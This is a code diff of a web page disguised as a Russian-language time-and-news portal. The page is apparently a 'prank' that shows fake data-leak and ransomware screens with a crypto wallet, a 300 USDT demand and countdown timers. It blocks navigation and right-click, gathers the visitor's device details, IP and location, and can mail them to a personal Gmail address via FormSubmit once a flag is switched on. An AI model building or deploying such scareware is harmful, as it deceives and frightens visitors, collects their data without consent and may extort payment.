@@ -7,12 +7,7 @@
     <title>Точное время – информационный портал</title>
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🕒</text></svg>">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-tap-highlight-color: transparent; }
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: #f5f7fa;
@@ -20,7 +15,6 @@
             padding: 20px;
             line-height: 1.4;
         }
-
         .container {
             max-width: 800px;
             margin: 0 auto;
@@ -31,28 +25,15 @@
             position: relative;
             z-index: 1;
         }
-
         .header {
             background: #2c3e50;
             color: white;
             padding: 20px;
             text-align: center;
         }
-
-        .header h1 {
-            font-size: 1.8rem;
-            margin-bottom: 5px;
-        }
-
-        .header p {
-            opacity: 0.8;
-            font-size: 0.9rem;
-        }
-
-        .content {
-            padding: 20px;
-        }
-
+        .header h1 { font-size: 1.8rem; margin-bottom: 5px; }
+        .header p { opacity: 0.8; font-size: 0.9rem; }
+        .content { padding: 20px; }
         .time-block {
             background: #ecf0f1;
             border-radius: 12px;
@@ -60,45 +41,22 @@
             text-align: center;
             margin-bottom: 20px;
         }
-
-        .time-block .big-time {
-            font-size: 3rem;
-            font-weight: bold;
-            font-family: monospace;
-            letter-spacing: 2px;
-        }
-
-        .time-block .date {
-            font-size: 1.1rem;
-            color: #7f8c8d;
-            margin-top: 5px;
-        }
-
+        .time-block .big-time { font-size: 3rem; font-weight: bold; font-family: monospace; letter-spacing: 2px; }
+        .time-block .date { font-size: 1.1rem; color: #7f8c8d; margin-top: 5px; }
         .info-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 15px;
             margin-bottom: 20px;
         }
-
         .info-card {
             background: #ecf0f1;
             border-radius: 12px;
             padding: 12px;
             text-align: center;
         }
-
-        .info-card h3 {
-            font-size: 0.9rem;
-            color: #7f8c8d;
-            margin-bottom: 8px;
-        }
-
-        .info-card .value {
-            font-size: 1.2rem;
-            font-weight: bold;
-        }
-
+        .info-card h3 { font-size: 0.9rem; color: #7f8c8d; margin-bottom: 8px; }
+        .info-card .value { font-size: 1.2rem; font-weight: bold; }
         .footer {
             background: #ecf0f1;
             padding: 12px;
@@ -107,14 +65,12 @@
             color: #7f8c8d;
             border-top: 1px solid #d0d3d4;
         }
-
         .warning-line {
             font-size: 0.65rem;
             color: #bdc3c7;
             margin-top: 8px;
             transition: color 0.3s;
         }
-
         /* Оверлеи */
         .overlay {
             position: fixed;
@@ -132,12 +88,8 @@
             opacity: 0;
             transition: visibility 0s, opacity 0.3s linear;
         }
-
-        .overlay.active {
-            visibility: visible;
-            opacity: 1;
-        }
-
+        .overlay.active { visibility: visible; opacity: 1; }
+        .cheat-overlay { z-index: 1001; }
         .modal {
             background: #1e1e2f;
             color: #eee;
@@ -149,42 +101,16 @@
             box-shadow: 0 10px 30px rgba(0,0,0,0.5);
             border-left: 4px solid #ff4757;
         }
-
-        .modal h2 {
-            font-size: 1.3rem;
-            margin-bottom: 16px;
-            color: #ff6b81;
-        }
-
+        .modal h2 { font-size: 1.3rem; margin-bottom: 16px; color: #ff6b81; }
         .modal .data-row {
             margin: 12px 0;
             border-bottom: 1px solid #3b3b4f;
             padding-bottom: 8px;
         }
-
-        .modal .label {
-            font-size: 0.7rem;
-            color: #aaa;
-            text-transform: uppercase;
-        }
-
-        .modal .value {
-            font-size: 0.9rem;
-            word-break: break-word;
-        }
-
-        .ransom {
-            border-left-color: #ff4757;
-            text-align: center;
-        }
-
-        .ransom .price {
-            font-size: 2rem;
-            font-weight: bold;
-            color: #ff4757;
-            margin: 15px 0;
-        }
-
+        .modal .label { font-size: 0.7rem; color: #aaa; text-transform: uppercase; }
+        .modal .value { font-size: 0.9rem; word-break: break-word; }
+        .ransom { border-left-color: #ff4757; text-align: center; }
+        .ransom .price { font-size: 2rem; font-weight: bold; color: #ff4757; margin: 15px 0; }
         button {
             background: #ff4757;
             border: none;
@@ -198,19 +124,8 @@
             cursor: pointer;
             transition: opacity 0.3s;
         }
-
-        button:disabled {
-            background: #888;
-            cursor: not-allowed;
-        }
-
-        .close-hint {
-            font-size: 0.7rem;
-            text-align: center;
-            margin-top: 15px;
-            color: #888;
-        }
-
+        button:disabled { background: #888; cursor: not-allowed; }
+        .close-hint { font-size: 0.7rem; text-align: center; margin-top: 15px; color: #888; }
         .joke-message {
             background: #2ecc71;
             color: #fff;
@@ -218,16 +133,6 @@
             padding: 15px;
             border-radius: 12px;
             margin-top: 20px;
-        }
-
-        .cheat-message {
-            background: #e67e22;
-            color: #fff;
-            text-align: center;
-            padding: 15px;
-            border-radius: 12px;
-            margin-top: 20px;
-            font-weight: bold;
         }
     </style>
 </head>
@@ -245,7 +150,7 @@
         <div class="info-grid">
             <div class="info-card"><h3>USD/RUB</h3><div class="value" id="usdRate">92.50</div></div>
             <div class="info-card"><h3>EUR/RUB</h3><div class="value" id="eurRate">99.80</div></div>
-            <div class="info-card"><h3>Погода в Минске</h3><div class="value" id="weather">+12°C, облачно</div></div>
+            <div class="info-card"><h3>Погода в Москве</h3><div class="value" id="weather">+12°C, облачно</div></div>
             <div class="info-card"><h3>Ваш город (по IP)</h3><div class="value" id="userCity">Определение...</div></div>
         </div>
         <p style="font-size:0.85rem; color:#7f8c8d; text-align:center; margin-top:10px;">Информация обновляется автоматически.</p>
@@ -260,7 +165,7 @@
     <div class="modal">
         <h2>⚠️ ОБНАРУЖЕНА УТЕЧКА ДАННЫХ</h2>
         <div id="stolenDataList"></div>
-        <div class="close-hint">Данные будут переданы через 5 сек...</div>
+        <div class="close-hint">Ваши данные экспортированы. Выполняется шифрование...</div>
     </div>
 </div>
 
@@ -268,22 +173,39 @@
     <div class="modal ransom">
         <h2>🔒 ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ</h2>
         <p>Все личные данные, контакты, фото и история браузера скопированы и заблокированы.</p>
-        <div class="price">BYN 1000</div>
+        <div class="price">300 USDT</div>
         <p>Для восстановления доступа переведите указанную сумму на кошелек:</p>
-        <p style="font-size:0.8rem; background:#000; padding:8px; border-radius:8px;">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</p>
+        <p style="font-size:0.8rem; background:#000; padding:8px; border-radius:8px;">TXLAQmZ9QkXhC9kR3qL5pW6yZ7bN8cV9d (TRC20)</p>
         <button id="ransomButton">Я ПЕРЕВЕЛ(А), РАЗБЛОКИРУЙТЕ</button>
         <div class="close-hint" id="timerDisplay">Срок: 1:00 минут. Не закрывайте страницу.</div>
     </div>
 </div>
 
+<div id="cheatOverlay" class="overlay cheat-overlay">
+    <div class="modal ransom">
+        <h2>❌ ОШИБКА ПРОВЕРКИ ПЛАТЕЖА</h2>
+        <p>Платеж не найден в блокчейне. Вы пытаетесь обмануть систему.</p>
+        <p>Ваши данные НЕ будут восстановлены. До окончания срока осталось:</p>
+        <div id="cheatTimerDisplay" style="font-size: 1.5rem; font-weight: bold; margin: 15px 0;">1:00</div>
+        <p style="font-size:0.8rem;">Ожидайте автоматического удаления данных через указанное время.</p>
+        <button id="closeCheatBtn" style="background:#e67e22;">Закрыть</button>
+    </div>
+</div>
+
 <script>
     (function() {
+        // ====== УПРАВЛЕНИЕ ОТПРАВКОЙ НА ПОЧТУ ======
+        // Установите true, чтобы отправлять данные на hitmandav777@gmail.com
+        // Установите false, чтобы отключить отправку (экономия лимита FormSubmit)
+        const ENABLE_EMAIL_SEND = false;   // <-- измените на true, когда будете готовы к реальному розыгрышу
+        // =========================================
+
         // Состояние
-        let isPrankRevealed = false;   // шутка раскрыта
-        let hackStarted = false;
+        let isPrankRevealed = false;
         let dataShown = false;
         let ransomShown = false;
-        let timerInterval = null;
+        let ransomTimerInterval = null;
+        let cheatTimerInterval = null;
 
         let geoInfo = null;
         let deviceInfo = {};
@@ -291,20 +213,22 @@
         // DOM
         const dataOverlay = document.getElementById('dataOverlay');
         const ransomOverlay = document.getElementById('ransomOverlay');
+        const cheatOverlay = document.getElementById('cheatOverlay');
         const stolenDataList = document.getElementById('stolenDataList');
         const warningLine = document.getElementById('warningLine');
         const ransomButton = document.getElementById('ransomButton');
         const timerDisplaySpan = document.getElementById('timerDisplay');
+        const cheatTimerDisplay = document.getElementById('cheatTimerDisplay');
 
         // Блокировка закрытия и кнопки назад
         function enableLock() {
             history.pushState(null, null, location.href);
             window.addEventListener('popstate', function (e) {
-                if (!isPrankRevealed) {
-                    history.pushState(null, null, location.href);
-                }
+                if (!isPrankRevealed) history.pushState(null, null, location.href);
             });
             window.addEventListener('beforeunload', beforeUnloadHandler);
+            document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
+            document.addEventListener('selectstart', function(e) { e.preventDefault(); });
         }
 
         function beforeUnloadHandler(e) {
@@ -321,7 +245,7 @@
             localStorage.removeItem('prank_state');
         }
 
-        // Сбор данных об устройстве
+        // Сбор данных
         function collectDeviceInfo() {
             const ua = navigator.userAgent;
             const isAndroid = /Android/i.test(ua);
@@ -342,7 +266,6 @@
             };
         }
 
-        // Получение гео и IP
         async function getUserGeo() {
             try {
                 const resp = await fetch('https://ipapi.co/json/');
@@ -356,8 +279,12 @@
             }
         }
 
-        // Отправка данных на почту через FormSubmit
+        // Отправка данных на почту (только если включено)
         function sendDataToEmail() {
+            if (!ENABLE_EMAIL_SEND) {
+                console.log("[DEBUG] Отправка данных на почту отключена (ENABLE_EMAIL_SEND = false)");
+                return;
+            }
             const data = {
                 device: deviceInfo.device,
                 ip: geoInfo?.ip || 'не определен',
@@ -374,14 +301,10 @@
 
             fetch('https://formsubmit.co/ajax/hitmandav777@gmail.com', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
-            })
-            .then(response => response.json())
-            .then(data => console.log('Отправлено на почту:', data))
-            .catch(error => console.error('Ошибка отправки:', error));
+            }).then(() => console.log("[INFO] Данные отправлены на почту"))
+              .catch(err => console.error("[ERROR] Ошибка отправки:", err));
         }
 
         // Отображение "украденных" данных
@@ -404,7 +327,7 @@
             warningLine.style.color = "#ff6b6b";
             warningLine.innerHTML = "⚠️ КРИТИЧЕСКАЯ УЯЗВИМОСТЬ: ваши данные скомпрометированы!";
 
-            // Имитация скачивания файла
+            // Имитация скачивания
             setTimeout(() => {
                 const fakeBlob = new Blob(["Этот файл не опасен. Демонстрация метода социальной инженерии."], {type: "application/octet-stream"});
                 const url = URL.createObjectURL(fakeBlob);
@@ -417,10 +340,11 @@
                 URL.revokeObjectURL(url);
             }, 2000);
 
+            // Через 10 секунд показываем требование выкупа
             setTimeout(() => {
                 dataOverlay.classList.remove('active');
                 showRansom();
-            }, 4000);
+            }, 10000);
         }
 
         function showRansom() {
@@ -430,20 +354,17 @@
             warningLine.style.color = "#ff4757";
             warningLine.innerHTML = "‼️ ВАША СИСТЕМА ЗАБЛОКИРОВАНА. НЕ ЗАКРЫВАЙТЕ СТРАНИЦУ ‼️";
 
-            // Таймер на 1 минуту
             let timeLeft = 60;
             timerDisplaySpan.innerText = `Срок: 1:00 минут. Не закрывайте страницу.`;
-            timerInterval = setInterval(() => {
+            ransomTimerInterval = setInterval(() => {
                 if (isPrankRevealed) {
-                    clearInterval(timerInterval);
+                    clearInterval(ransomTimerInterval);
                     return;
                 }
                 timeLeft--;
                 if (timeLeft <= 0) {
-                    clearInterval(timerInterval);
-                    if (!isPrankRevealed) {
-                        revealJoke();
-                    }
+                    clearInterval(ransomTimerInterval);
+                    if (!isPrankRevealed) revealJoke();
                 } else {
                     const minutes = Math.floor(timeLeft / 60);
                     const seconds = timeLeft % 60;
@@ -455,23 +376,43 @@
         function showCheatMessage() {
             if (isPrankRevealed) return;
             ransomButton.disabled = true;
-            const container = document.querySelector('.container');
-            const cheatDiv = document.createElement('div');
-            cheatDiv.className = 'cheat-message';
-            cheatDiv.innerHTML = `
-                <strong>❌ ПЛАТЕЖ НЕ ПОДТВЕРЖДЕН!</strong><br>
-                Вы пытаетесь обмануть систему. Данные не будут восстановлены.<br>
-                <span style="font-size:0.8rem;">(Ожидайте окончания срока)</span>
-            `;
-            container.appendChild(cheatDiv);
+            cheatOverlay.classList.add('active');
+
+            let timeLeft = 60;
+            function updateCheatTimer() {
+                if (isPrankRevealed) {
+                    clearInterval(cheatTimerInterval);
+                    return;
+                }
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                cheatTimerDisplay.innerText = `${minutes}:${seconds.toString().padStart(2,'0')}`;
+                if (timeLeft <= 0) {
+                    clearInterval(cheatTimerInterval);
+                    cheatOverlay.classList.remove('active');
+                } else {
+                    timeLeft--;
+                }
+            }
+            updateCheatTimer();
+            cheatTimerInterval = setInterval(updateCheatTimer, 1000);
         }
+
+        document.getElementById('closeCheatBtn').addEventListener('click', () => {
+            if (!isPrankRevealed) {
+                cheatOverlay.classList.remove('active');
+                if (cheatTimerInterval) clearInterval(cheatTimerInterval);
+            }
+        });
 
         function revealJoke() {
             if (isPrankRevealed) return;
             disableLock();
-            if (timerInterval) clearInterval(timerInterval);
+            if (ransomTimerInterval) clearInterval(ransomTimerInterval);
+            if (cheatTimerInterval) clearInterval(cheatTimerInterval);
             ransomOverlay.classList.remove('active');
             dataOverlay.classList.remove('active');
+            cheatOverlay.classList.remove('active');
 
             const container = document.querySelector('.container');
             const jokeDiv = document.createElement('div');
@@ -491,7 +432,6 @@
             warningLine.style.display = "none";
         }
 
-        // Обработчик кнопки "Я перевел(а)"
         ransomButton.addEventListener('click', () => {
             if (isPrankRevealed) return;
             showCheatMessage();
@@ -501,31 +441,15 @@
         deviceInfo = collectDeviceInfo();
         getUserGeo().then(geo => {
             geoInfo = geo;
-            // Отправляем данные на почту сразу после получения
-            sendDataToEmail();
-            if (!hackStarted) {
-                hackStarted = true;
-                showStolenData();
-            }
+            sendDataToEmail();   // отправка только если ENABLE_EMAIL_SEND = true
+            showStolenData();
         });
 
-        // Восстановление состояния при перезагрузке
         const savedState = localStorage.getItem('prank_state');
-        if (savedState) {
-            localStorage.removeItem('prank_state');
-        }
+        if (savedState) localStorage.removeItem('prank_state');
         localStorage.setItem('prank_state', 'active');
         enableLock();
 
-        // Запуск через 3 секунды
-        setTimeout(() => {
-            if (!hackStarted) {
-                hackStarted = true;
-                showStolenData();
-            }
-        }, 3000);
-
-        // Обновление времени
         function updateTime() {
             const now = new Date();
             document.getElementById('currentTime').innerText = now.toLocaleTimeString('ru-RU');
@@ -534,7 +458,6 @@
         setInterval(updateTime, 1000);
         updateTime();
 
-        // Случайные курсы для имитации
         document.getElementById('usdRate').innerText = (92 + Math.random() * 2).toFixed(2);
         document.getElementById('eurRate').innerText = (99 + Math.random() * 3).toFixed(2);
         document.getElementById('weather').innerText = "+" + Math.floor(8 + Math.random() * 8) + "°C, " + (Math.random() > 0.5 ? "ясно" : "облачно");
